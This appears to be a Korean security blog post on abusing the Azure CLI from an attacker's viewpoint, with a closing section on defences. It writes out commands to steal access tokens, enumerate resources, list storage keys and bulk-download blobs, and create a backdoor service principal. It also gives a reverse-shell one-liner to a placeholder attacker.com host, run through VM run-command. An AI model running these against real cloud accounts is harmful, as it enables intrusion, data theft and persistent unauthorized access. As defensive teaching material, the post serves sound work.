---
layout: post
title: "Azure CLI Attack & Recon"
date: 2025-09-18 17:00:00 +0900
categories: [system-hacking]
tags: [Azure CLI, Cloud Hacking, Reconnaissance, Lateral Movement]
description: "공격자 관점에서의 Azure CLI 활용: 리소스 정찰, 데이터 유출, 그리고 백도어 계정 생성"
---

## 1. 개요

**Azure CLI**는 Azure 리소스를 관리하기 위한 명령줄 도구이지만, 보안 관점에서는 공격자가 클라우드 환경을 장악하는 데 사용할 수 있는 가장 강력한 무기 중 하나이다.
공격자가 침해한 시스템에 Azure CLI 세션(`~/.azure/accessTokens.json`)이 남아있다면, 별도의 인증 없이도 클라우드 인프라 전체에 접근하여 데이터를 유출하거나 백도어를 심을 수 있다.
본 글에서는 공격자 관점에서의 Azure CLI 활용법을 정찰, 데이터 유출, 지속성 유지 단계로 나누어 분석하고, 이를 방어하기 위한 보안 설정을 다룬다.

---

## 2. 정찰 및 정보 유출

공격자는 먼저 현재 계정의 권한과 사용 가능한 리소스를 파악한다.

### 계정 정보 확인
현재 로그인된 구독(Subscription) 정보와 JWT 액세스 토큰을 확인한다. 이 토큰을 탈취하면 다른 도구에서도 사용할 수 있다.

```bash
az account show
az account get-access-token
```

### 리소스 탐색
전체 리소스 그룹과 실행 중인 가상 머신(VM) 목록을 조회하여 공격 대상을 식별한다.

```bash
# 모든 리소스 그룹 나열
az group list --output table

# 실행 중인 가상 머신(VM) 목록 및 IP 확인
az vm list -d --output table
```

### 스토리지 데이터 유출
스토리지 계정의 키를 확보하면 컨테이너 내부의 모든 파일에 접근할 수 있다.

```bash
# 스토리지 계정 키 나열
az storage account keys list -g MyResourceGroup -n MyStorageAccount

# Blob 컨테이너의 모든 파일 다운로드
az storage blob download-batch -d . -s MyContainer --account-name MyStorageAccount --account-key [Key]
```

![AzureCLI_VM](/assets/images/system-hacking/AzureCLI_VM.png)

---

## 3. 지속성 유지

공격자는 나중에 다시 접근하기 위해 백도어 계정을 생성하거나 권한을 상승시킬 수 있다.

### 서비스 주체 생성
서비스 주체는 자동화된 작업에 사용되는 ID이지만, 공격자에게는 완벽한 백도어 역할을 한다.

```bash
az ad sp create-for-rbac --name "BackupAdmin" --role contributor
```

이 명령은 `appId`, `password`, `tenant` 정보를 반환한다. 공격자는 이 정보만 있으면 언제 어디서든 Azure에 로그인할 수 있다.

```bash
# 백도어로 로그인
az login --service-principal -u [appId] -p [password] --tenant [tenant]
```

### VM 명령 실행
VM에 직접 접속하지 않고도 명령을 실행하여 리버스 쉘을 맺을 수 있다.

```bash
az vm run-command invoke -g MyGroup -n MyVM --command-id RunShellScript --scripts "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

---

## 4. 방어 대책

*   **Cloud Shell 제한**: 프로덕션 서버에는 불필요하게 Azure CLI를 설치하지 않는다.
*   **RBAC (역할 기반 접근 제어)**: 사용자에게 `Owner`나 `Contributor` 같은 과도한 권한을 주지 말고, 필요한 리소스에만 접근 가능한 최소 권한을 부여한다.
*   **조건부 액세스 (Conditional Access)**: 특정 위치(사내망)나 관리되는 기기에서만 Azure 관리에 접근할 수 있도록 정책을 설정한다.
*   **로그 모니터링**: `Azure Activity Log`를 모니터링하여 비정상적인 `az` 명령어 실행이나 새로운 서비스 주체 생성(`az ad sp create`)을 탐지한다.

<hr class="short-rule">